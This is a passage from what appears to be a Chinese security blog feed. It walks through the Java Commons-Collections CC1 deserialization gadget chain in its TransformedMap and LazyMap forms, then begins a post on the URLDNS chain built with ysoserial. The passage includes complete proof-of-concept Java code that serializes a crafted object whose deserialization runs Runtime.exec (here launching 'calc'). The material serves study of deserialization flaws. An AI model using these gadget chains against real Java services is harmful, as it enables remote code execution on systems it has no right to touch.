class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //获取Runtime类对象</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                //反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                //反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                //反射调用exec方法，并执行该方法</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //通过链转换器进行循环调用transformers数组</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>在理解<code>ConstantTransformer</code>的<code>transform(Object)</code>方法的实际原理时也挺绕，可以试着把上面的执行效果带入到该方法中，能更好的理解如何实现最后调用到<code>InvokerTransformer</code>方法并传入<code>Runtime</code>对象<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-33.png" title="transform方法"><br>通过一次一次循环把对应<code>Object</code>输出到下次作为输入就能理解怎么实现的了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">object = new ConstantTransformer(Runtime.class).transform(123); </span><br><span class="line">//= Runtime.class transform中输入任何数字都返回Runtime对象，但还没实例化</span><br><span class="line"></span><br><span class="line">Object = new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;).transform(Runtime.class) </span><br><span class="line">//=Runtime.class.getRuntime()  调用Runtime对象的getRuntime() 但该方法还没执行，只是获取了该方法</span><br><span class="line"></span><br><span class="line">Object = new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;).transform(Runtime.class.getRuntime()) </span><br><span class="line">//=Runtime.class.getRuntime()  执行Runtime.getRuntime() 此时正式实例化了Runtime对象</span><br><span class="line"></span><br><span class="line">Object = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(Runtime.class.getRuntime().invoke())</span><br><span class="line">//=Runtime.class.getRuntime().exec(&quot;calc&quot;) 执行Runtime.exec()方法</span><br></pre></td></tr></table></figure><p>3、在实现了2步骤的一长段的利用链的相关调用，最后就是传递的b就是<code>Transformer transformerChain = new ChainedTransformer(transformers);</code>中的<code>transformerChain</code>数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//获取AnnotationInvocationHandler类对象</span><br><span class="line">        Class cla=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span><br><span class="line">        Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        //传入参数用a,b代替表示</span><br><span class="line">        Object obj=cons.newInstance(Generated.class,transformerChain);</span><br></pre></td></tr></table></figure><p>4、最后就是序列化该<code>AnnotationInvocationHandler</code>对象，反序列化时触发漏洞，得到最终POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //获取Runtime类对象</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                //反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                //反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                //反射调用exec方法，并执行该方法</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //通过链转换器进行循环调用transformers数组</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;aaa&quot;);</span><br><span class="line">        Map tmap = TransformedMap.decorate(map, null, transformerChain);</span><br><span class="line">        //反射获取AnnotationInvocationHandler的对象传入tmap</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        Object obj = declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line"></span><br><span class="line">        //序列化写入文件</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;result.ser&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        //反序列化触发漏洞</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;result.ser&quot;));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>接下来是LazyMap链，CC1的另一条链，也是ysoserial中利用CC1的链。在分析<code>InvokerTransformer</code>类时说到该类为最终的执行类，找到调用<code>InvokerTransformer.transform(Object)</code>方法的类，其中有上文分析的TransformedMap类，还有个就是LazyMap类<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-36.png" title="调用transform方法的类"><br>该类通过构造方法传入对象并赋值给<code>factory</code><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-38.png" title="构造方法"><br>调用了<code>transform()</code>方法的<code>get</code>方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-37.png" title="get方法"><br><code>get</code>方法中会判断参数<code>key</code>是否为<code>HashMap</code>中<code>Map</code>的内容，如果不是<code>Map</code>中的内容，就创建一个<code>value</code>作为<code>key</code>的值放入<code>Map</code>中，给value赋值时调用了<code>transform()</code>方法。<br>该<code>get()</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用，通过构造方法传入<code>LazyMap</code>对象然后在<code>invoke</code>方法中调用到<code>LazyMap.get()</code>方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-39.png" title="invoke方法"><br>invoke方法的调用并不在该类重写的<code>readObject</code>方法中，因此入口点就有点变化，<code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>动态类，这里调用<code>invoke</code>方法就涉及到<strong>动态代理</strong><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-40.png" title="InvocationHandler"><br>动态代理<code>InvocationHandler</code>：</p><blockquote><p>每一个动态代理类的调用处理程序都必须实现InvocationHandler接口，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现InvocationHandler接口类的invoke方法来调用</p></blockquote><p>实现方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[接口类] proxyMap=(接口类)Proxy.newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh)</span><br></pre></td></tr></table></figure><p>例如使用Map对象进行动态代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure><p>其中涉及到<code>Proxy</code>代理类，并通过<code>newProxyInstance()</code>实现动态代理。<br><code>newProxyInstance</code>类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh);</span><br></pre></td></tr></table></figure><p>三个参数分别表示:目标对象所属类的加载器、目标对象实现的接口数组、调用接口时触发的对应方法</p><p>实现demo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Proxydemo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        class demo implements InvocationHandler&#123;</span><br><span class="line">            private Map map;</span><br><span class="line"></span><br><span class="line">            public demo(Map map)&#123;</span><br><span class="line">                this.map=map;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                System.out.println(&quot;调用了invoke方法&quot;);</span><br><span class="line">                if(method.getName().equals(&quot;put&quot;))&#123;</span><br><span class="line">                    System.out.println(&quot;调用了put方法&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        InvocationHandler in=new demo(new HashMap());</span><br><span class="line">        Map map=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,in);</span><br><span class="line">        map.put(&quot;11&quot;,&quot;11&quot;);</span><br><span class="line">        map.put(&quot;22&quot;,&quot;22&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">![](cc1-41.png &quot;InvocationHandler&quot;)</span><br></pre></td></tr></table></figure><p>可以看到map对象每执行一次方法，便会调用执行一次invoke方法，invoke方法也可以起拦截器的作用。</p><p>简单了解了动态代理的用法，接下来回到LazyMap类的调用<br><code>LazyMap</code>的<code>get</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用<br>因此入口点就在实现动态类调用到LazyMap的invoke方法。</p><h3 id="完整利用链-1"><a href="#完整利用链-1" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>LazyMap CC1链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="构造POC-1"><a href="#构造POC-1" class="headerlink" title="构造POC"></a>构造POC</h3><p>POC的前半段依旧采用TransformedMap利用链的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //获取Runtime类对象</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                //反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                //反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                //反射调用exec方法，并执行该方法</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //通过链转换器进行循环调用transformers数组</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br></pre></td></tr></table></figure><p>将传参入口变更至LazyMap类中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map Lmap = LazyMap.decorate(map, transformerChain);</span><br></pre></td></tr></table></figure><p>同<code>TransformedMap</code>利用链一样通过反射调用<code>AnnotationInvocationHandler</code>类，然后调用InvocationHandler代理调用<code>AnnotationInvocationHandler</code>类的构造函数传入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//反射调用AnnotationInvocationHandler类</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br></pre></td></tr></table></figure><p>然后创建<code>proxy</code>代理对象，参数分别为<code>Map加载器</code>、<code>Map类数组</code>、<code>InvocationHandler对象invohandler</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invohandler);</span><br></pre></td></tr></table></figure><p>再通过代理调用代理对象，执行<code>AnnotationInvocationHandler.invoke</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br></pre></td></tr></table></figure><p>最后就是对<code>InvocationHandler</code>对象进行序列化，再反序列化触发漏洞</p><p>得到最终POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //获取Runtime类对象</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                //反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                //反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                //反射调用exec方法，并执行该方法</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //通过链转换器进行循环调用transformers数组</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        //创建LazyMap对象调用decorate回调方法</span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        //反射调用AnnotationInvocationHandler类</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        //创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">        //创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">        //通过代理调用代理对象，执行invoke方法</span><br><span class="line">        InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line"></span><br><span class="line">        //序列化InvocationHandler对象</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;exp.ser&quot;));</span><br><span class="line">        out.writeObject(invohandlerproxy);</span><br><span class="line">        //反序列化触发漏洞</span><br><span class="line">        ObjectInputStream input = new ObjectInputStream(new FileInputStream(&quot;exp.ser&quot;));</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-42.png" title="执行POC"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>整体来说就是找到能够执行恶意函数的方法，然后一步步查看调用链，最后找到反序列化入口，cc1链看下来就比URL链复杂很多，链路调用步骤多了很多，有些链的类还需要明白怎么实现的，LazyMap加了动态代理然后调用链更绕。<br>分析单从完整利用链来推导相对容易很多，但会错过很多细节以及实现原理，可能会导致当时看完明白了过后过了段时间再回想就没法理清完整的利用链，这次分析的过程花费了不少的时间，中间有很多原理细节琢磨了有点久，只是记了我认为需要细理解的地方，可能还有些小细节没些或者被跳过了没注意，后面再看到的话再补充进来吧。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a><br>P牛-Java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-URLDNS链学习与分析</title>
      <link href="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>延伸java序列化和java反射的内容，针对一些gadget利用链的一些学习，理解一下利用链的分析过程。<br>本文学习URLDNS反序列化链，也是java反序列化利用链里面最简单的一条，也利用java反序列化和反射的相关知识，可把前两篇java基础学习的知识运用在利用链里面，记录下利用链相关知识点。</p><p>本文角度两个方面，一是从ysoserial工具利用URLDNS角度分析学习，另一个角度是从URLDNS利用链分析学习。</p><h1 id="0x01、URLDNS链简述"><a href="#0x01、URLDNS链简述" class="headerlink" title="0x01、URLDNS链简述"></a>0x01、URLDNS链简述</h1><p>URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果<font color=red>不是命令执⾏</font>，⽽是<font color=red>⼀次DNS请求</font>。</p><p>URLDNS通常用于快速监测是否存在反序列化漏洞，尤其对<strong>无回显的漏洞检测</strong>，原因：</p><ul><li>只依赖原生类</li><li>不限制jdk版本</li></ul><p>也就是说URLDN可直接调用java内置库即可进行操作，无需依赖其他第三方组件，同时不限制jdk版本不通带来的语言代码差异。</p><p>URLDNS链主要问题产生于HashMap,<font color=red>HashMap重写了readObject()反序列化方法，并且参数可控导致序列化漏洞</font>。</p><blockquote><p>HashMap简单介绍:<br>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。<br>HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。<br>HashMap 是无序的，即不会记录插入的顺序。<br>HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。</p></blockquote><h1 id="0x02、yso-URLDNS利用链分析"><a href="#0x02、yso-URLDNS利用链分析" class="headerlink" title="0x02、yso-URLDNS利用链分析"></a>0x02、yso-URLDNS利用链分析</h1><h2 id="ysoserial环境准备"><a href="#ysoserial环境准备" class="headerlink" title="ysoserial环境准备"></a>ysoserial环境准备</h2><p>运行环境：idea<br>java环境: jdk8<br>漏洞环境：ysoserial(<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>)</p><p>idea相关配置:<br>下载ysoserial漏洞环境后在idea打开项目，idea会自动同步pom.xml中的依赖，注意的点是，需要更改文件-项目结构-项目设置-项目中的sdk版本和sdk默认值，如下图即可，不然在编译上可能会报错。随后构建项目即可。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-1.png" title="项目结构"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-2.png" title="java环境"><br>通过pol.xml知道主程序位置<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-4.png" title="主程序"><br>在运行或者debug调试GeneratePayload.java文件，出现下面红色提示表示运行正常，项目部署成功，便可进行urldns链测试。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-3.png" title="运行部署"><br>运行-编辑配置里输入测试参数<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-7.png" title="运行部署"><br>相当于使用主程序直接执行命令<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-5.png" title="URLDNS序列化数据"></p><h2 id="yso-URLDNS链分析"><a href="#yso-URLDNS链分析" class="headerlink" title="yso-URLDNS链分析"></a>yso-URLDNS链分析</h2><p>yso生成URLDNS利用的序列化数据，主要为<code>URLDNS</code>、<code>url</code>两个参数<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-5.png" title="URLDNS序列化数据"><br>在主程序获取参数下断点<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-6.png" title="断点"><br>进行debug调试，参数<code>args[0]</code>即URLDNS传递给<code>payloadType</code>变量，参数<code>args[1]</code>即url传递给<code>command</code>变量<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-8.png" title="断点"></p><p>获取Class类对象，类为<code>GeneratePayload.class.getPackage().getName() + &quot;.payloads.&quot; + className</code>对应得就是<code>ysoserial.payloads.URLDNS</code>类<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-10.png" title="获取类对象"><br>对应返回给<code>payloadClass</code>对象<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-11.png" title="获取类对象"><br>接下来对<code>Class对象</code>进行实例化<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-12.png" title="实例化"><br>跟进<code>getObject()</code>方法，传递command参数也就是传入的url参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 